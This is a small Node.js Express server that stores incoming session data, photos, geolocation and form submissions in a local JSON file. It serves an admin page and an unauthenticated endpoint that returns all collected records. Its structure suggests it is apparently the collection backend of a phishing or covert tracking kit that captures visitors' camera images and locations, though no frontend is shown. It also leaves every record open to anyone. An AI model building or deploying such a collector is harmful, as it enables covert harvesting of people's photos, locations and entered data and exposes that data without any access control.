const express = require('express');
const path = require('path');
const fs = require('fs');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname)));

const dataFile = path.join(__dirname, '.data', 'data.json');
let dataStore = { sessions: [], photos: [], locations: [], forms: [] };

try {
    fs.mkdirSync(path.join(__dirname, '.data'), { recursive: true });
    if (fs.existsSync(dataFile)) dataStore = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
} catch(e) {}

function saveData() {
    try { fs.writeFileSync(dataFile, JSON.stringify(dataStore)); } catch(e) {}
}

app.post('/api/session', (req, res) => {
    dataStore.sessions.push({ ...req.body, time: new Date().toLocaleString('id-ID') });
    saveData();
    res.json({ success: true });
});

app.post('/api/photo', (req, res) => {
    dataStore.photos.push({ ...req.body, time: new Date().toLocaleString('id-ID') });
    saveData();
    res.json({ success: true });
});

app.post('/api/location', (req, res) => {
    dataStore.locations.push({ ...req.body, time: new Date().toLocaleString('id-ID') });
    saveData();
    res.json({ success: true });
});

app.post('/api/submit', (req, res) => {
    dataStore.forms.push({ ...req.body, time: new Date().toLocaleString('id-ID') });
    saveData();
    res.json({ success: true });
});

app.get('/api/data', (req, res) => {
    res.json({ success: true, data: dataStore });
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

app.listen(PORT, () => {
    console.log('Admin server running on port ' + PORT);
});
